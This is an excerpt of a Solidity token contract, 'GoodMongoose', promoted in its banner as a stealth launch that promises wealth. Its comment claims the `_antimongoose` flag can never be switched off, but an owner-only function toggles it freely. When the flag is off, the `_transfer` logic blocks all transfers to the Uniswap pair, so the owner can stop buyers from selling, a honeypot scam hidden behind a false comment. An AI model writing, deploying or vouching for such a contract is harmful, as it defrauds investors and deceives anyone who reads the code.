...
/*
  ________                  .___    _____                                                    
 /  _____/  ____   ____   __| _/   /     \   ____   ____    ____   ____   ____  ______ ____  
/   \  ___ /  _ \ /  _ \ / __ |   /  \ /  \ /  _ \ /    \  / ___\ /  _ \ /  _ \/  ___// __ \ 
\    \_\  (  <_> |  <_> ) /_/ |  /    Y    (  <_> )   |  \/ /_/  >  <_> |  <_> )___ \\  ___/ 
 \______  /\____/ \____/\____ |  \____|__  /\____/|___|  /\___  / \____/ \____/____  >\___  >
        \/                   \/          \/            \//_____/                   \/     \/ 
Stealth Launch - The Good Mongoose brings you much prosperity and wealth
*/
...
contract GoodMongoose is  Context, IERC20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    ...
    bool private _antimongoose = true; //once switched on, can never be switched off.
    ...
    constructor() {
        _feeAddrWallet1 = payable(0xe8468c89768069841A9c32d97bC3327219A07213);
    ...
    function _transfer(
        ...
        if (!_antimongoose) {
            require(to != uniSwapPair, "ERC20: antimongoose is not enabled yet");
        }
    ...
    function antimongooseStatus(bool _state) public onlyOwner {
        _antimongoose = _state;
